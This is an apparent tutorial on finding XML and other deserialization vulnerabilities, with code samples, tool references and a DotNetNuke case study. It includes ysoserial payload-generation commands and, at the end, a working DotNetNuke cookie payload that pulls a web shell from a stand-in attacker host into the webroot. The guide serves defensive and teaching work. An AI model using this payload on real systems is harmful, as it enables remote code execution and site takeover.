## How to Spot XML Serialization/Deserialization 


Vulnerabilities

### 1. **Understand Serialization Basics**
   - **Serialization Example**:
     ```csharp
     MyClass obj = new MyClass();
     XmlSerializer serializer = new XmlSerializer(typeof(MyClass));
     using (StreamWriter writer = new StreamWriter("file.xml"))
     {
         serializer.Serialize(writer, obj);
     }
     ```
   - **Deserialization Example**:
     ```csharp
     XmlSerializer serializer = new XmlSerializer(typeof(MyClass));
     using (StreamReader reader = new StreamReader("file.xml"))
     {
         MyClass obj = (MyClass)serializer.Deserialize(reader);
     }
     ```

### 2. **Identify Entry Points for Deserialization**
   - **Cookies**:
     ```csharp
     string cookieValue = Request.Cookies["DNNPersonalization"].Value;
     var deserializedObject = DeserializeObject(cookieValue);
     ```
   - **Form Fields**:
     ```csharp
     string formData = Request.Form["serializedData"];
     var deserializedObject = DeserializeObject(formData);
     ```
   - **API Endpoints**:
     ```csharp
     [HttpPost]
     public IActionResult DeserializeData([FromBody] string data)
     {
         var deserializedObject = DeserializeObject(data);
         return Ok();
     }
     ```

### 3. **Review Code for Deserialization Functions**
   - **.NET Specific**:
     ```csharp
     XmlSerializer serializer = new XmlSerializer(typeof(MyClass));
     using (StreamReader reader = new StreamReader("file.xml"))
     {
         MyClass obj = (MyClass)serializer.Deserialize(reader);
     }
     ```
   - **Other Languages**:
     - **Java**:
       ```java
       ObjectInputStream ois = new ObjectInputStream(new FileInputStream("file.ser"));
       MyClass obj = (MyClass) ois.readObject();
       ois.close();
       ```
     - **Python**:
       ```python
       import pickle
       with open('file.pkl', 'rb') as f:
           obj = pickle.load(f)
       ```
     - **PHP**:
       ```php
       $obj = unserialize($serializedData);
       ```

### 4. **Assess the Safety of Deserialization**
   - **Trusted Source Check**:
     ```csharp
     if (IsTrustedSource(data))
     {
         var obj = DeserializeObject(data);
     }
     ```
   - **Validation/Sanitization**:
     ```csharp
     if (ValidateData(data))
     {
         var obj = DeserializeObject(data);
     }
     ```

### 5. **Understand Common Vulnerable Patterns**
   - **Insecure Deserialization**:
     ```csharp
     XmlSerializer serializer = new XmlSerializer(typeof(MyClass));
     using (StreamReader reader = new StreamReader("file.xml"))
     {
         MyClass obj = (MyClass)serializer.Deserialize(reader);
     }
     ```
   - **Gadgets**: Gadgets are pieces of code that can be used during deserialization to perform malicious actions. They are often found in libraries that the application uses.

### 6. **Use Static and Dynamic Analysis Tools**
   - **Static Code Analysis**:
     - **SonarQube**: Configure SonarQube to scan your codebase for deserialization patterns.
   - **Dynamic Analysis**:
     - **Burp Suite**: Intercept and modify serialized data in real-time.
     ```python
     import requests
     url = 'http://example.com/api/endpoint'
     payload = {'data': '<serialized_data>'}
     r = requests.post(url, data=payload)
     print(r.text)
     ```

### 7. **Test for Vulnerabilities**
   - **Proof of Concept (PoC)**:
     - **ysoserial.net**: Generate payloads for .NET deserialization.
     ```bash
     ysoserial.exe -o base64 -g ObjectDataProvider -f "calc"
     ```
   - **Automated Tools**:
     - **ysoserial** for Java:
       ```bash
       java -jar ysoserial.jar CommonsCollections1 "calc.exe" > payload.ser
       ```

### 8. **Perform Security Testing on Deserialization Code**
   - **Fuzzing**:
     - Use a tool like **Burp Intruder** to send malformed serialized data.
     ```python
     from boofuzz import *
     session = Session(
         target=Target(
             connection=SocketConnection("192.168.1.1", 9999, proto='tcp')
         ),
     )
     s_initialize("Request")
     s_static("GET /")
     s_string("fuzzdata")
     session.connect(s_get("Request"))
     session.fuzz()
     ```
   - **Review Dependencies**:
     - Check for third-party libraries with known vulnerabilities using tools like **Retire.js** or **Snyk**.

### 9. **Common Indicators of Vulnerability**
   - **Untrusted Data Sources**: Deserialization of data from cookies, user inputs, or external files without validation.
   - **Absence of Validation**:
     ```csharp
     XmlSerializer serializer = new XmlSerializer(typeof(MyClass));
     using (StreamReader reader = new StreamReader("file.xml"))
     {
         MyClass obj = (MyClass)serializer.Deserialize(reader);
     }
     ```
   - **Dynamic Type Handling**:
     ```csharp
     Type type = Type.GetType(typeName);
     XmlSerializer serializer = new XmlSerializer(type);
     var obj = serializer.Deserialize(reader);
     ```
   - **Public Properties and Fields**:
     ```csharp
     public class MyClass
     {
         public string Name { get; set; }
         public int Age { get; set; }
     }
     ```

### 10. **Practical Example: DotNetNuke Case Study**
   - **Identify the Entry Point**: The `LoadProfile` function in DotNetNuke.
     ```csharp
     string cookieValue = Request.Cookies["DNNPersonalization"].Value;
     var deserializedObject = DeserializeObject(cookieValue);
     ```
   - **Understand the Deserialization Flow**:
     ```csharp
     public Hashtable LoadProfile()
     {
         string data = Request.Cookies["DNNPersonalization"].Value;
         return DeserializeHashTableXml(data, "profile");
     }

     public Hashtable DeserializeHashTableXml(string data, string rootName)
     {
         Hashtable hashtable;
         using (StringReader stringReader = new StringReader(data))
         {
             XmlSerializer xmlSerializer = new XmlSerializer(typeof(Hashtable), new XmlRootAttribute(rootName));
             hashtable = (Hashtable)xmlSerializer.Deserialize(stringReader);
         }
         return hashtable;
     }
     ```
   - **Assess the Payload**: Determine how a crafted payload can manipulate the deserialization process to execute arbitrary code.
     ```xml
     <profile>
         <item key="myTableEntry" type="System.Data.Services.Internal.ExpandedWrapper`2[[DotNetNuke.Common.Utilities.FileSystemUtils, DotNetNuke, Version=9.1.0.367, Culture=neutral, PublicKeyToken=null],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089">
             <ExpandedWrapperOfFileSystemUtilsObjectDataProvider xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
                 <ProjectedProperty0>
                     <ObjectInstance xsi:type="FileSystemUtils" />
                     <MethodName>PullFile</MethodName>
                     <MethodParameters>
                         <anyType xsi:type="xsd:string">http://attacker.com/shell.aspx</anyType>
                         <anyType xsi:type="xsd:string">C:/inetpub/wwwroot/dotnetnuke/shell.aspx</anyType>
                     </MethodParameters>
                 </ProjectedProperty0>
             </ExpandedWrapperOfFileSystemUtilsObjectDataProvider>
         </item>
     </profile>
     ```

By following these examples and focusing on specific patterns, you can effectively spot and test for XML serialization/deserialization vulnerabilities in applications.